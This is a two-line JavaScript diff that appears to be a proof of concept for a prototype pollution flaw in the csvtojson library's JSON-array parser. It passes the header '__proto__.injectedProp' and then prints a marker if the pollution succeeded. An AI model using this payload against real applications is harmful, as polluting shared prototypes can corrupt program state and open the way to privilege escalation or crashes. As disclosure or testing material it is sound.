@@ -1,0 +1,2 @@
+require("csvtojson/v1/core/defaultParsers/parser_jsonarray").parserFunc({ head: "a.__proto__.injectedProp", resultRow: {}, item: 'pollutedValue', regExp: /\./ });
+console.log({}.injectedProp !== undefined ? '[POLLUTION_TRIGGERED]':'');
